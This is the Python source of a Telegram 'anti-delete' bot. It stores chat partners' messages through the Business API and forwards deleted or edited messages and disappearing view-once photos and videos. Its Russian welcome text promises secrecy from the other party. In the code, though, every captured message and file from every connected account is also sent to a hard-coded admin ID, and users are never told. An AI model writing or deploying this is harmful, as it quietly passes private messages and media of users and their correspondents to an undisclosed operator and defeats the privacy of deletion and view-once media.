"""
Telegram-бот: сохраняет сообщения собеседников через Business API
и присылает владельцу удалённые/изменённые сообщения вместе с медиа.

Требования: Telegram Premium у владельца + бот, подключённый в
Настройки -> Telegram для бизнеса -> Чат-боты (права: читать сообщения).
"""
import asyncio
import html
import logging
import os
import sqlite3
import time
from pathlib import Path

from aiogram import Bot, Dispatcher
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    BusinessConnection,
    BusinessMessagesDeleted,
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

BOT_TOKEN = os.environ["BOT_TOKEN"]
ADMIN_ID = int(os.environ["ADMIN_ID"])  # куда слать ВСЁ от всех аккаунтов
DATA_DIR = Path(os.getenv("DATA_DIR", "data"))
RETENTION_DAYS = int(os.getenv("RETENTION_DAYS", "14"))
MAX_DOWNLOAD = 20 * 1024 * 1024  # лимит Bot API на скачивание

MEDIA_DIR = DATA_DIR / "media"
MEDIA_DIR.mkdir(parents=True, exist_ok=True)

BOT_USERNAME = "@Antidelite_bot"
BANNER = Path(__file__).parent / "banner.png"

WELCOME = (
    "🗑 <b>Удалили или изменили сообщение? Покажу, что там было.</b>\n"
    "Ещё ловлю исчезающие фото и видео.\n\n"
    "<b>Как подключить за 3 шага:</b>\n"
    "1️⃣ Профиль → <b>Изменить</b> → <b>Автоматизация чатов</b>\n"
    f"2️⃣ Вставь в поиск имя бота: <code>{BOT_USERNAME}</code> (нажми, чтобы скопировать)\n"
    "3️⃣ Нажми <b>Добавить</b> — и готово\n\n"
    "📸 <b>Чтобы сохранить исчезающее фото или видео</b> (одноразовое, «просмотр один раз») — "
    "<b>ответь на него</b> любым текстом (свайп по фото влево → ответь). "
    "Оно тут же прилетит в сохранёнку. Успей ответить, пока фото не исчезло.\n\n"
    "Собеседник ничего не узнает, от твоего имени я ничего не пишу. "
    "Отключить можно в любой момент там же."
)

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("saver")

db = sqlite3.connect(DATA_DIR / "saver.db")
db.executescript(
    """
    CREATE TABLE IF NOT EXISTS connections(
        id TEXT PRIMARY KEY,
        owner_id INTEGER NOT NULL,
        owner_chat_id INTEGER NOT NULL,
        owner_name TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS messages(
        conn_id TEXT, chat_id INTEGER, msg_id INTEGER,
        sender_id INTEGER, sender_name TEXT,
        text TEXT, media_type TEXT, file_path TEXT, ts INTEGER,
        PRIMARY KEY(conn_id, chat_id, msg_id)
    );
    """
)
db.commit()

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()


# ---------- helpers ----------
def get_conn(conn_id: str):
    return db.execute(
        "SELECT owner_id, owner_chat_id, owner_name FROM connections WHERE id=?",
        (conn_id,),
    ).fetchone()


def extract_media(m: Message):
    """-> (тип, file_id, расширение, размер)"""
    if m.photo:
        p = m.photo[-1]
        return "photo", p.file_id, ".jpg", p.file_size or 0
    if m.video:
        return "video", m.video.file_id, ".mp4", m.video.file_size or 0
    if m.video_note:
        return "video_note", m.video_note.file_id, ".mp4", m.video_note.file_size or 0
    if m.voice:
        return "voice", m.voice.file_id, ".ogg", m.voice.file_size or 0
    if m.audio:
        return "audio", m.audio.file_id, ".mp3", m.audio.file_size or 0
    if m.animation:
        return "animation", m.animation.file_id, ".mp4", m.animation.file_size or 0
    if m.sticker:
        return "sticker", m.sticker.file_id, ".webp", m.sticker.file_size or 0
    if m.document:
        ext = Path(m.document.file_name or "").suffix or ".bin"
        return "document", m.document.file_id, ext, m.document.file_size or 0
    return None, None, "", 0


def sender_label(m: Message) -> str:
    u = m.from_user
    if not u:
        return "?"
    name = u.full_name
    return f"{name} (@{u.username})" if u.username else name


async def save_message(m: Message, owner_id: int | None = None):
    conn_id = m.business_connection_id
    if not conn_id:
        return
    mtype, file_id, ext, size = extract_media(m)
    path = None
    if file_id and size <= MAX_DOWNLOAD:
        dest = MEDIA_DIR / f"{m.chat.id}_{m.message_id}{ext}"
        try:
            await bot.download(file_id, destination=dest)
            path = str(dest)
        except Exception as e:  # noqa: BLE001
            log.warning("download failed: %s", e)
    text = m.text or m.caption or ""
    db.execute(
        "INSERT OR REPLACE INTO messages VALUES (?,?,?,?,?,?,?,?,?)",
        (
            conn_id, m.chat.id, m.message_id,
            m.from_user.id if m.from_user else None,
            sender_label(m), text, mtype, path, int(time.time()),
        ),
    )
    db.commit()


async def send_saved(owner_chat_id: int, header: str, row):
    """row = (sender_name, text, media_type, file_path)"""
    _, text, mtype, path = row
    body = f"\n\n{html.escape(text)}" if text else ""
    caption = (header + body)[:1024]
    if path and Path(path).exists():
        f = FSInputFile(path)
        senders = {
            "photo": bot.send_photo, "video": bot.send_video,
            "video_note": bot.send_video_note, "voice": bot.send_voice,
            "audio": bot.send_audio, "animation": bot.send_animation,
            "sticker": bot.send_sticker, "document": bot.send_document,
        }
        fn = senders.get(mtype, bot.send_document)
        if mtype in ("video_note", "sticker"):
            await bot.send_message(owner_chat_id, header + body)
            await fn(owner_chat_id, f)
        else:
            await fn(owner_chat_id, f, caption=caption)
    else:
        note = "\n<i>(медиа не сохранилось)</i>" if mtype else ""
        await bot.send_message(owner_chat_id, header + body + note)


# ---------- handlers ----------
def recipients(owner_chat_id: int) -> list[int]:
    """Админу + самому подключённому аккаунту (в его чат с ботом)."""
    return [ADMIN_ID] if owner_chat_id == ADMIN_ID else [ADMIN_ID, owner_chat_id]


async def notify(chat_ids: list[int], coro_factory):
    for cid in chat_ids:
        try:
            await coro_factory(cid)
        except Exception as e:  # noqa: BLE001
            # аккаунт мог не нажать /start у бота — админу всё равно дойдёт
            log.warning("не доставлено в %s: %s", cid, e)


def acc_label(name: str) -> str:
    return f"👤 <b>Аккаунт:</b> {html.escape(name)}\n"


def welcome_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👀 Как это выглядит", callback_data="demo")],
        ]
    )


@dp.message(Command("start"))
async def start(m: Message):
    # приветствие с баннером и инструкцией — всем
    if BANNER.exists():
        await m.answer_photo(FSInputFile(BANNER), caption=WELCOME, reply_markup=welcome_kb())
    else:
        await m.answer(WELCOME, reply_markup=welcome_kb())
    # если это уже подключённый аккаунт — подтверждаем доставку сюда
    if m.from_user.id != ADMIN_ID and db.execute(
        "SELECT 1 FROM connections WHERE owner_id=?", (m.from_user.id,)
    ).fetchone():
        await m.answer("✅ Этот аккаунт подключён. Удалённое и изменённое буду слать и сюда.")
    if m.from_user.id == ADMIN_ID:
        await m.answer(
            "Ты админ. Всё от всех подключённых аккаунтов прилетает сюда.\n"
            "/accounts — список подключённых."
        )


@dp.callback_query(lambda c: c.data == "demo")
async def demo(c: CallbackQuery):
    await c.message.answer(
        "Пример того, что придёт:\n\n"
        "🗑 <b>Иван (@ivan)</b> удалил(а) сообщение\n\n"
        "«Ладно, забудь, это не важно»\n\n"
        "✏️ <b>Иван</b> изменил(а) сообщение\n"
        "<b>Было:</b> 5000\n<b>Стало:</b> 500"
    )
    await c.answer()


@dp.message(Command("accounts"))
async def accounts(m: Message):
    if m.from_user.id != ADMIN_ID:
        return
    rows = db.execute("SELECT owner_name FROM connections").fetchall()
    await m.answer("\n".join(f"• {html.escape(r[0])}" for r in rows) or "Пока никого.")


@dp.business_connection()
async def on_connection(bc: BusinessConnection):
    name = bc.user.full_name + (f" (@{bc.user.username})" if bc.user.username else "")
    if bc.is_enabled:
        db.execute(
            "INSERT OR REPLACE INTO connections VALUES (?,?,?,?)",
            (bc.id, bc.user.id, bc.user_chat_id, name),
        )
        db.commit()
        await notify(
            recipients(bc.user_chat_id),
            lambda cid: bot.send_message(cid, f"✅ Подключён аккаунт: {html.escape(name)}"),
        )
    else:
        db.execute("DELETE FROM connections WHERE id=?", (bc.id,))
        db.commit()
        await bot.send_message(ADMIN_ID, f"❌ Отключён аккаунт: {html.escape(name)}")


async def capture_reply_media(m: Message):
    """Трюк с исчезающими фото: если это ответ на сообщение с медиа,
    скачиваем медиа из reply_to_message и шлём админу + владельцу."""
    r = m.reply_to_message
    if not r:
        return
    mtype, file_id, ext, size = extract_media(r)
    if not file_id or mtype not in ("photo", "video", "video_note", "animation"):
        return
    conn = get_conn(m.business_connection_id)
    if not conn:
        return
    _, owner_chat, owner_name = conn
    path = None
    if size <= MAX_DOWNLOAD:
        dest = MEDIA_DIR / f"ttl_{m.chat.id}_{r.message_id}{ext}"
        try:
            await bot.download(file_id, destination=dest)
            path = str(dest)
        except Exception as e:  # noqa: BLE001
            log.warning("ttl download failed: %s", e)
    sender = sender_label(r) if r.from_user else "собеседник"
    header = acc_label(owner_name) + f"👻 Исчезающее медиа от <b>{html.escape(sender)}</b>"
    await notify(
        recipients(owner_chat),
        lambda cid: send_saved(cid, header, (sender, "", mtype, path)),
    )


@dp.business_message()
async def on_message(m: Message):
    await save_message(m)
    await capture_reply_media(m)


@dp.edited_business_message()
async def on_edit(m: Message):
    conn = get_conn(m.business_connection_id)
    if not conn:
        return
    owner_id, owner_chat, owner_name = conn
    old = db.execute(
        "SELECT text FROM messages WHERE conn_id=? AND chat_id=? AND msg_id=?",
        (m.business_connection_id, m.chat.id, m.message_id),
    ).fetchone()
    new_text = m.text or m.caption or ""
    if m.from_user and m.from_user.id != owner_id and old and old[0] != new_text:
        msg_text = (
            acc_label(owner_name)
            + f"✏️ <b>{html.escape(sender_label(m))}</b> изменил(а) сообщение\n\n"
            f"<b>Было:</b>\n{html.escape(old[0] or '—')}\n\n"
            f"<b>Стало:</b>\n{html.escape(new_text or '—')}"
        )
        await notify(recipients(owner_chat), lambda cid: bot.send_message(cid, msg_text))
    db.execute(
        "UPDATE messages SET text=? WHERE conn_id=? AND chat_id=? AND msg_id=?",
        (new_text, m.business_connection_id, m.chat.id, m.message_id),
    )
    db.commit()


@dp.deleted_business_messages()
async def on_deleted(ev: BusinessMessagesDeleted):
    conn = get_conn(ev.business_connection_id)
    if not conn:
        return
    owner_id, owner_chat, owner_name = conn
    for mid in ev.message_ids:
        r = db.execute(
            "SELECT sender_id, sender_name, text, media_type, file_path "
            "FROM messages WHERE conn_id=? AND chat_id=? AND msg_id=?",
            (ev.business_connection_id, ev.chat.id, mid),
        ).fetchone()
        if not r:
            continue
        sender_id, name, text, mtype, path = r
        if sender_id == owner_id:  # свои удаления не трогаем
            continue
        header = acc_label(owner_name) + f"🗑 <b>{html.escape(name)}</b> удалил(а) сообщение"
        await notify(
            recipients(owner_chat),
            lambda cid: send_saved(cid, header, (name, text, mtype, path)),
        )


# ---------- уборка старых файлов ----------
async def cleanup_loop():
    while True:
        cutoff = int(time.time()) - RETENTION_DAYS * 86400
        rows = db.execute(
            "SELECT conn_id, chat_id, msg_id, file_path FROM messages WHERE ts<?",
            (cutoff,),
        ).fetchall()
        for conn_id, chat_id, msg_id, fp in rows:
            if fp:
                Path(fp).unlink(missing_ok=True)
            db.execute(
                "DELETE FROM messages WHERE conn_id=? AND chat_id=? AND msg_id=?",
                (conn_id, chat_id, msg_id),
            )
        db.commit()
        await asyncio.sleep(6 * 3600)


async def main():
    asyncio.create_task(cleanup_loop())
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())


if __name__ == "__main__":
    asyncio.run(main())
